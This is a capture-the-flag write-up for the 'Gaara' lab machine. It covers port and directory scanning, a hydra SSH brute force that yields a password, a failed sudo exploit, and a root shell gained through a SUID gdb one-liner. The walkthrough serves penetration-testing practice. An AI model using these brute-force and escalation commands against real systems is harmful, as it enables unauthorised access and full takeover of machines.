@@ -1,0 +1,82 @@
+NMAP SCAN
+=====================
+# nmap -sC -sV 192.168.53.142
+22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
+| ssh-hostkey: 
+|   2048 3e:a3:6f:64:03:33:1e:76:f8:e4:98:fe:be:e9:8e:58 (RSA)
+|   256 6c:0e:b5:00:e7:42:44:48:65:ef:fe:d7:7c:e6:64:d5 (ECDSA)
+|_  256 b7:51:f2:f9:85:57:66:a8:65:54:2e:05:f9:40:d2:f4 (ED25519)
+80/tcp open  http    Apache httpd 2.4.38 ((Debian))
+|_http-server-header: Apache/2.4.38 (Debian)
+|_http-title: Gaara
+
+DIRECTORY SCAN
+=====================
+# gobuster dir -u http://192.168.53.142 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 
+===============================================================
+/server-status        (Status: 403) [Size: 279]
+/Cryoserver
+
+USER FLAG
+=====================
+Visiting the /Cryoserver, there are a number of listed directories:
+/Temari
+/Kazekage
+/iamGaara
+
+I try to bruteforce each of these but got nothing.
+
+Eventually I decide to ssh bruteforce the user and luckily a password is returned.
+# hydra -l gaara -P rockyou.txt ssh://192.168.53.142
+[22][ssh] host: 192.168.53.142   login: gaara   password: iloveyou2
+
+I ssh in using the creds and that's it, user flag obtained!
+
+PRIVILEGE ESCALATION
+=====================
+I run linenum shell to see what I may find. I come across the below section
+
+### SOFTWARE #############################################
+[-] Sudo version:
+Sudo version 1.8.27
+
+I go ahead and check what exploit maybe available. I find below
+# searchsploit sudo 1.8.27
+------------------------------------------- ---------------------------------
+ Exploit Title                             |  Path
+------------------------------------------- ---------------------------------
+sudo 1.8.27 - Security Bypass              | linux/local/47502.py
+------------------------------------------- ---------------------------------
+
+I upload this exploit on victim machine and run it.
+
+This did not work since the user is not added to sudoers group.
+
+gaara@Gaara:~$ find / -perm -u=s 2>/dev/null
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/openssh/ssh-keysign
+/usr/bin/gdb
+/usr/bin/sudo
+/usr/bin/gimp-2.10
+/usr/bin/fusermount
+/usr/bin/chsh
+/usr/bin/chfn
+/usr/bin/gpasswd
+/usr/bin/newgrp
+/usr/bin/su
+/usr/bin/passwd
+/usr/bin/mount
+/usr/bin/umount
+
+Of interest is gdb:
+gaara@Gaara:~$ ls -al /usr/bin/gdb
+-rwsr-sr-x 1 root root 8008480 Oct 14  2019 /usr/bin/gdb
+It has the SUID bit set.
+
+gaara@Gaara:~$ /usr/bin/gdb -nx -ex 'python import os; os.execl("/bin/sh", "sh", "-p")' -ex quit
+# id
+uid=1001(gaara) gid=1001(gaara) euid=0(root) egid=0(root) groups=0(root),1001(gaara)
+
+That's it the box is rooted!
+
